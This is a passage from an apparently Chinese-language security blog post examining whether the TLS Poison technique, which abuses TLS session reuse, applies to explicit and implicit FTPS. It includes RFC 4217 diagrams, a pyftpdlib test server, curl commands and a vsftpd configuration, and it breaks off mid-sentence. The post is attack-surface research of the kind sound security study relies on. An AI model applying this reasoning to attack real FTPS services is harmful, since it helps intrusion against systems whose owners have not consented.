class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">12.6.  A Standard Data Transfer with Protection</span><br><span class="line"></span><br><span class="line">             <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">     control          data                   data               control</span><br><span class="line">   ====================================================================</span><br><span class="line"></span><br><span class="line">                      socket()</span><br><span class="line">                      bind()</span><br><span class="line">    <span class="hljs-built_in"> PORT </span>w,x,y,z,a,b --------------------------------------------&gt;</span><br><span class="line">         &lt;-------------------------------------------------------- 200</span><br><span class="line">     STOR file ---------------------------------------------------&gt;</span><br><span class="line">                                             socket()</span><br><span class="line">                                             bind()</span><br><span class="line">         &lt;-------------------------------------------------------- 150</span><br><span class="line">                      accept()  &lt;----------  connect()</span><br><span class="line">                      TLSneg()  &lt;----------&gt; TLSneg()</span><br><span class="line">                      TLSwrite() ----------&gt; TLSread()</span><br><span class="line">                      TLSshutdown() -------&gt; TLSshutdown()</span><br><span class="line">                      close()    ----------&gt; close()</span><br><span class="line">         &lt;-------------------------------------------------------- 226</span><br><span class="line"></span><br><span class="line">12.7.  A Firewall-Friendly Data Transfer with Protection</span><br><span class="line"></span><br><span class="line">             <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">     control          data                   data               control</span><br><span class="line">   ====================================================================</span><br><span class="line"></span><br><span class="line">     PASV --------------------------------------------------------&gt;</span><br><span class="line">                                             socket()</span><br><span class="line">                                             bind()</span><br><span class="line">         &lt;------------------------------------------ 227 (w,x,y,z,a,b)</span><br><span class="line">                      socket()</span><br><span class="line">     STOR file ---------------------------------------------------&gt;</span><br><span class="line">                      connect()  ----------&gt; accept()</span><br><span class="line">         &lt;-------------------------------------------------------- 150</span><br><span class="line">                      TLSneg()   &lt;---------&gt; TLSneg()</span><br><span class="line">                      TLSwrite()  ---------&gt; TLSread()</span><br><span class="line">                      TLSshutdown() -------&gt; TLSshutdown()</span><br><span class="line">                      close()     ---------&gt; close()</span><br><span class="line">         &lt;-------------------------------------------------------- 226</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="TLS-Poison-In-FTPS"><a href="#TLS-Poison-In-FTPS" class="headerlink" title="TLS Poison In FTPS"></a>TLS Poison In FTPS</h2><p>&#x770B;&#x5230;&#x5982;&#x4E0A;&#x89E3;&#x91CA;&#xFF0C;&#x60F3;&#x5FC5;&#x5927;&#x5BB6;&#x53EF;&#x80FD;&#x4E5F;&#x4F1A;&#x6709;&#x601D;&#x8003;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E0D;&#x662F; FTPS &#x4E5F;&#x4F1A;&#x6709; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#x7279;&#x6027;&#x5462;&#xFF1F;&#x90A3;&#x4E48;&#x662F;&#x4E0D;&#x662F;&#x4E5F;&#x53EF;&#x4EE5;&#x8DDF; TLS Poison &#x76F8;&#x5173;&#x8054;&#x8D77;&#x6765;&#x5462;&#xFF1F;</p><h3 id="Explicit"><a href="#Explicit" class="headerlink" title="Explicit"></a>Explicit</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x6765;&#x5148;&#x770B;&#x770B;&#x62E5;&#x6709; RFC 4217 &#x89C4;&#x8303;&#x7684;&#x663E;&#x793A; FTPS &#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x501F;&#x7528; pyftpdlib &#x6765;&#x505A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684; FTPS Server</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="hljs-string">An RFC-4217 asynchronous FTPS server supporting both SSL and TLS.</span></span><br><span class="line"><span class="hljs-string">Requires PyOpenSSL module (http://pypi.python.org/pypi/pyOpenSSL).</span></span><br><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.servers <span class="hljs-keyword">import</span> FTPServer</span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.authorizers <span class="hljs-keyword">import</span> DummyAuthorizer</span><br><span class="line"><span class="hljs-keyword">from</span> pyftpdlib.handlers <span class="hljs-keyword">import</span> TLS_FTPHandler</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    authorizer = DummyAuthorizer()</span><br><span class="line">    <span class="hljs-comment"># authorizer.add_user(&apos;ftpuser&apos;, &apos;ftpuser123&apos;, &apos;.&apos;, perm=&apos;elradfmwMT&apos;)</span></span><br><span class="line">    authorizer.add_anonymous(<span class="hljs-string">&apos;.&apos;</span>)</span><br><span class="line">    handler = TLS_FTPHandler</span><br><span class="line">    handler.certfile = <span class="hljs-string">&apos;keycert.pem&apos;</span></span><br><span class="line">    handler.authorizer = authorizer</span><br><span class="line">    <span class="hljs-comment"># requires SSL for both control and data channel</span></span><br><span class="line">    handler.tls_control_required = <span class="hljs-literal">True</span></span><br><span class="line">    handler.tls_data_required = <span class="hljs-literal">True</span></span><br><span class="line">    server = FTPServer((<span class="hljs-string">&apos;&apos;</span>, <span class="hljs-number">11211</span>), handler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BF9;&#x4E8E;&#x5BA2;&#x6237;&#x7AEF;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; curl &#x6765;&#x53D1;&#x8D77;&#x4E00;&#x4E2A;&#x663E;&#x5F0F; FTPS &#x8BF7;&#x6C42;&#xFF1A;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --ftp-ssl --user name:passwd ftp://ftp.host.com/</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x9700;&#x8981;&#x7528;&#x6237;&#x9A8C;&#x8BC1;&#x5C31;&#x52A0;&#x4E0A;<code>--user</code>&#x9009;&#x9879;&#x5373;&#x53EF;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x7684;&#x8BDD;&#x5C31;&#x4E0D;&#x7528;&#xFF0C;&#x7ED3;&#x679C;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000343.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6E05;&#x695A;&#x7684;&#x770B;&#x5230;&#x5728;&#x663E;&#x5F0F; FTPS &#x5728;&#x4F7F;&#x7528;<code>AUTH SSL</code>&#x547D;&#x4EE4;&#x4E4B;&#x540E;&#x624D;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x5EFA;&#x7ACB;&#x7684; TLS &#x8FDE;&#x63A5;&#xFF0C;&#x5E76;&#x5728;<code>LIST</code>&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x91CD;&#x65B0;&#x4F7F;&#x7528;&#x4E86; TLS Session &#x3002;</p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x7B80;&#x5355;&#x56DE;&#x987E;&#x4E00;&#x4E0B;&#xFF0C;&#x5728;&#x5229;&#x7528; HTTPS &#x8FDB;&#x884C; TLS Poison &#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x518D;&#x6B21;&#x4F7F;&#x7528; HTTP &#x91CD;&#x5B9A;&#x5411;&#x8BA9;&#x5BA2;&#x6237;&#x7AEF;&#x91CD;&#x65B0;&#x4E0E;&#x6211;&#x4EEC;&#x5EFA;&#x7ACB;&#x4F1A;&#x8BDD;&#xFF0C;&#x4F46;&#x662F;&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF; FTPS &#xFF0C;&#x6211;&#x4EEC;&#x5E76;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7C7B;&#x4F3C; HTTPS &#x91CD;&#x5B9A;&#x5411;&#x7684;&#x529F;&#x80FD;&#x8BA9;&#x5176;&#x518D;&#x6B21;&#x4E0E; FTPS &#x670D;&#x52A1;&#x5668;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x4EEC;&#x53EA;&#x662F;&#x7B80;&#x5355;&#x8BBF;&#x95EE;&#x4E00;&#x6B21; FTPS &#x670D;&#x52A1;&#x5668;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#x73B0;&#x8C61;&#x5462;&#xFF1F;</p><p>&#x8BA9;&#x6211;&#x4EEC;&#x770B;&#x4E4B;&#x524D;&#x53D1;&#x751F;&#x4E86;&#x4EC0;&#x4E48;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528;&#x4E86;<code>EPSV</code>&#x547D;&#x4EE4;&#x8868;&#x793A;&#x4F7F;&#x7528; FTP &#x88AB;&#x52A8;&#x6A21;&#x5F0F;&#xFF0C;FTP &#x670D;&#x52A1;&#x5668;&#x4EE5;<code>(||||32949)</code>&#x5BF9;&#x8BE5;&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x4E86;&#x56DE;&#x590D;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x7B80;&#x5355;&#x56DE;&#x987E;&#x4E00;&#x4E0B; FTP &#x7684;&#x88AB;&#x52A8;&#x6A21;&#x5F0F;&#xFF1A;&#x5728;&#x88AB;&#x52A8;&#x6A21;&#x5F0F;&#x7684; FTP &#x4E2D;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x542F;&#x52A8;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E24;&#x4E2A;&#x8FDE;&#x63A5;&#xFF0C;<strong>&#x89E3;&#x51B3;&#x4E86;&#x9632;&#x706B;&#x5899;&#x963B;&#x6B62;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4F20;&#x5165;&#x6570;&#x636E;&#x7AEF;&#x53E3;&#x8FDE;&#x63A5;&#x7684;&#x95EE;&#x9898;</strong>&#x3002;FTP &#x8FDE;&#x63A5;&#x5EFA;&#x7ACB;&#x540E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x672C;&#x5730;&#x6253;&#x5F00;&#x4E24;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x975E;&#x7CFB;&#x7EDF;&#x7AEF;&#x53E3; N &#x548C; N + 1(N &gt; 1023)&#x3002;&#x7B2C;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684; 21 &#x7AEF;&#x53E3;&#xFF0C;&#x4F46;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x8FD9;&#x6B21;&#x5C06;&#x4F1A;&#x53D1;&#x51FA; PASV &#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4E0D;&#x5141;&#x8BB8;&#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;&#x56DE;&#x5176;&#x6570;&#x636E;&#x7AEF;&#x53E3;&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x968F;&#x540E;&#x4F1A;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x975E;&#x7CFB;&#x7EDF;&#x7AEF;&#x53E3; P (P &gt; 1023)&#xFF0C;&#x5E76;&#x5C06; P &#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x4F5C;&#x4E3A; PASV &#x547D;&#x4EE4;&#x7684;&#x54CD;&#x5E94;&#x3002;&#x7136;&#x540E;&#x5BA2;&#x6237;&#x7AEF;&#x542F;&#x52A8;&#x4ECE;&#x7AEF;&#x53E3; N+1 &#x5230;&#x7AEF;&#x53E3; P &#x7684;&#x8FDE;&#x63A5;&#x6765;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x3002;&#x5176;&#x4E2D;<code>EPSV</code>&#x547D;&#x4EE4;&#x4E3A;<code>PASV</code>&#x7684;&#x66F4;&#x65B0;&#x7248;&#x672C;&#xFF0C;&#x4E3B;&#x8981;&#x4E3A;&#x4E86;&#x517C;&#x5BB9; IPv6 &#x800C;&#x5728; RFC 2428 &#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://miro.medium.com/max/1926/1*yyyR4y2MDi3O7_NeUmiGjw.png" alt></p><p>&#x6240;&#x4EE5;&#x5728;&#x88AB;&#x52A8;&#x6A21;&#x5F0F;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x501F;&#x7531;&#x4E0A;&#x56FE;&#x6E05;&#x695A;&#x7684;&#x660E;&#x767D;&#xFF0C;&#x5728;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x9636;&#x6BB5;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x9700;&#x8981;&#x4E0E;&#x670D;&#x52A1;&#x7AEF;&#x91CD;&#x65B0;&#x5EFA;&#x7ACB;&#x4E00;&#x6B21;&#x8FDE;&#x63A5;&#xFF01;&#x800C;&#x5728;&#x663E;&#x5F0F; FTPS &#x5F53;&#x4E2D;&#xFF0C;&#x91CD;&#x65B0;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x5C31;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x4F7F;&#x7528; TLS &#x4F1A;&#x8BDD;&#xFF0C;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x53EF;&#x80FD;&#x88AB; TLS Poison &#x653B;&#x51FB;&#xFF01;</p><h3 id="Implicit"><a href="#Implicit" class="headerlink" title="Implicit"></a>Implicit</h3><p>&#x5BF9;&#x4E8E;&#x9690;&#x5F0F;&#x6A21;&#x5F0F;&#xFF0C;&#x56E0;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x9700;&#x8981;&#x5EFA;&#x7ACB; TLS &#x4F1A;&#x8BDD;&#xFF0C;&#x6240;&#x4EE5;&#x5373;&#x4F7F;&#x6CA1;&#x6709; RFC &#x89C4;&#x5B9A;&#xFF0C;&#x7406;&#x8BBA;&#x4E0A;&#x4E5F;&#x5F88;&#x660E;&#x663E;&#x5E94;&#x8BE5;&#x4E5F;&#x540C;&#x6837;&#x4F1A;&#x652F;&#x6301; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#x673A;&#x5236;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; vsftpd &#x6765;&#x8FDB;&#x884C;&#x7B80;&#x5355;&#x5B9E;&#x9A8C;&#xFF0C;&#x5B89;&#x88C5; vsftpd &#x540E;&#x5728; /etc/vsftp.conf &#x4E2D;&#x5F00;&#x542F;<code>implicit_ssl=YES</code>&#x9009;&#x9879;</p><p>&#x53C2;&#x8003;&#x914D;&#x7F6E;&#xFF1A;</p><p></p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">listen</span>=<span class="hljs-literal">NO</span></span><br><span class="line"><span class="hljs-attr">listen_ipv6</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">anonymous_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">local_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">write_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">local_umask</span>=<span class="hljs-number">022</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">anon_root</span>=/var/ftp/</span><br><span class="line"><span class="hljs-attr">no_anon_password</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">hide_ids</span>=<span class="hljs-literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">dirmessage_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">use_localtime</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">xferlog_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">connect_from_port_20</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">secure_chroot_dir</span>=/var/run/vsftpd/empty</span><br><span class="line"><span class="hljs-attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="hljs-attr">pasv_enable</span>=<span class="hljs-literal">Yes</span></span><br><span class="line"><span class="hljs-attr">pasv_min_port</span>=<span class="hljs-number">10000</span></span><br><span class="line"><span class="hljs-attr">pasv_max_port</span>=<span class="hljs-number">11000</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">rsa_cert_file</span>=/home/ubuntu/tls/fullchain.pem</span><br><span class="line"><span class="hljs-attr">rsa_private_key_file</span>=/home/ubuntu/tls/privkey.pem</span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">ssl_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">ssl_ciphers</span>=HIGH</span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">allow_anon_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">force_local_data_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">force_local_logins_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">ssl_tlsv1</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">ssl_sslv2</span>=<span class="hljs-literal">NO</span></span><br><span class="line"><span class="hljs-attr">ssl_sslv3</span>=<span class="hljs-literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">listen_port</span>=<span class="hljs-number">11211</span></span><br><span class="line"><span class="hljs-attr">implicit_ssl</span>=<span class="hljs-literal">YES</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BF7;&#x6309;&#x7167;&#x5176;&#x4ED6;&#x6559;&#x7A0B;&#x7533;&#x8BF7;&#x5BF9;&#x5E94;&#x57DF;&#x540D;&#x8BC1;&#x4E66;&#x3001;&#x914D;&#x7F6E;&#x597D;&#x533F;&#x540D; ssl &#x8BBF;&#x95EE; vsftpd &#xFF0C;&#x5426;&#x5219;&#x5F88;&#x5BB9;&#x6613;&#x5BFC;&#x81F4; vsftpd &#x62A5;&#x9519;&#xFF0C;&#x5E76;&#x4E14;&#x68C0;&#x67E5;&#x597D; vsftpd &#x72B6;&#x6001;&#x662F;&#x5426;&#x6210;&#x529F;&#x8FD0;&#x884C;&#x3002;</p><p>&#x914D;&#x7F6E;&#x597D; vsftpd &#x540E;&#x4F7F;&#x7528; curl &#x8FDB;&#x884C;&#x8BBF;&#x95EE;:</p><p></p><figure class="highlight groovy hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="hljs-string">ftps:</span><span class="hljs-comment">//exmaple.com -v</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x6211;&#x53E6;&#x5916;&#x589E;&#x52A0;&#x4E86;<code>--tls-max 1.2</code>&#x9009;&#x9879;&#xFF0C;&#x56E0;&#x4E3A;&#x5728; TLS 1.3 &#x5F53;&#x4E2D;&#xFF0C; Session ID &#x4F20;&#x8F93;&#x5728;&#x52A0;&#x5BC6;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4E0D;&#x4FBF;&#x89C2;&#x5BDF;&#xFF0C;&#x800C; TLS 1.2 &#x53EF;&#x4EE5;&#x5728; Server Hello 